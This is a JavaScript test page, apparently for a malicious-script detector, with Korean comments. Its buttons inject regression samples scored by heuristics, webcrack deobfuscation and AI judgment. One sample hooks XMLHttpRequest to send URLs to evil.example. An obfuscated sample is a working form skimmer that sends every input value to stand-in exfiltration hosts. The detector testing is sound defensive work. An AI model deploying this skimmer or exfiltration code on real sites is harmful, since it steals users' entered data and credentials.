const statusEl = document.getElementById("status");
const setStatus = (s) => { if (statusEl) statusEl.textContent = s; };

// 아래 스니펫들은 scoring-model-v1.json의 substring 매칭을 기준으로
// 점수가 MEDIUM(50~79)에 들어가도록 문자열을 구성한 회귀 테스트 샘플
// - BENIGN: UI/핸들러 관련 문자열 위주(실제 악성 동작 없음)
// - MALICIOUS: XHR hook + https exfil 패턴(전형적 악성)
// - WEBCRACK_OBF: 원문 난독(브라켓/concat) 형태라 초기 스코어는 LOW로 떨어지고,
//                 /dumps(webcrack 재스코어링)에서 MEDIUM 진입 후 AI 판정까지 가는지 확인용

const SNIPPET_BENIGN_MED = `
// BENIGN regression sample: harmless strings for UI overlay + click handling.
// (intentionally medium by heuristics; no network exfil, no eval)
const overlayCss = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;opacity:0;";
const msg = String.fromCharCode(84, 117, 116, 111, 114, 105, 97, 108); // fromCharCode
const handlerName = "onclick";
const onClick = (e) => { e.preventDefault(); e.stopPropagation(); };
const _ = 'addEventListener("mousedown"'; // keyword string only
console.log(msg, overlayCss, handlerName, onClick, _);
`.trim();

const SNIPPET_MAL_MED = `
// MALICIOUS regression sample: XHR prototype hook + exfil to https://evil.example/collect
(function () {
  const _open = XMLHttpRequest.prototype.open;
  const _send = XMLHttpRequest.prototype.send;

  XMLHttpRequest.prototype.open = function (method, url) {
    this.__brs_u = url;
    return _open.apply(this, arguments);
  };

  XMLHttpRequest.prototype.send = function (body) {
    try {
      fetch("https://evil.example/collect", { method: "POST", body: String(this.__brs_u || "") });
    } catch {}
    return _send.apply(this, arguments);
  };
})();
`.trim();

const SNIPPET_WEBCRACK_OBF = `
(function(){var _pad='AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';try{atob('QQ==');}catch(e){}var u1='https://collector.evil-cdn.com/api/collect';var u2='https://backup.exfil-server.net/beacon';try{var _orig=XMLHttpRequest.prototype[('set'+'Request'+'Header')];XMLHttpRequest.prototype[('set'+'Request'+'Header')]=function(h,v){return _orig.apply(this,arguments);};}catch(e){}function send(data){try{window[('fe'+'tch')](u1,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data),[('kee'+'pal'+'ive')]:true});}catch(e){}try{navigator[('send'+'Beacon')](u2,JSON.stringify(data));}catch(e){}}try{document.addEventListener('blur',function(e){try{var t=e&&e.target;if(!t||!t.tagName)return;if(String(t.tagName).toLowerCase()!=='input')return;var data={};var ins=document.querySelectorAll('input');for(var i=0;i<ins.length;i++){var el=ins[i];var k=el.name||el.id||('f'+i);data[k]=String(el.value||'');}send(data);}catch(_){}} ,true);}catch(e){}})();
`.trim();

function injectInlineScript(text) {
  const s = document.createElement("script");
  s.type = "text/javascript";
  s.textContent = text;
  (document.head || document.documentElement).appendChild(s);
  return s;
}

document.getElementById("btn-benign")?.addEventListener("click", () => {
  setStatus("BENIGN(중간점수용) 인라인 스크립트 주입 중… (대시보드에서 점수/AI 판정 확인)");
  injectInlineScript(SNIPPET_BENIGN_MED);
});

document.getElementById("btn-mal")?.addEventListener("click", () => {
  setStatus("MALICIOUS(중간점수용) 인라인 스크립트 주입 중… (대시보드에서 점수/AI 판정 확인)");
  injectInlineScript(SNIPPET_MAL_MED);
});

document.getElementById("btn-webcrack-obf")?.addEventListener("click", () => {
  setStatus("원문(난독 OBF) 인라인 스크립트 주입 중… (LOW → /dumps webcrack 재스코어 → MEDIUM → AI 판정 기대)");
  injectInlineScript(SNIPPET_WEBCRACK_OBF);
});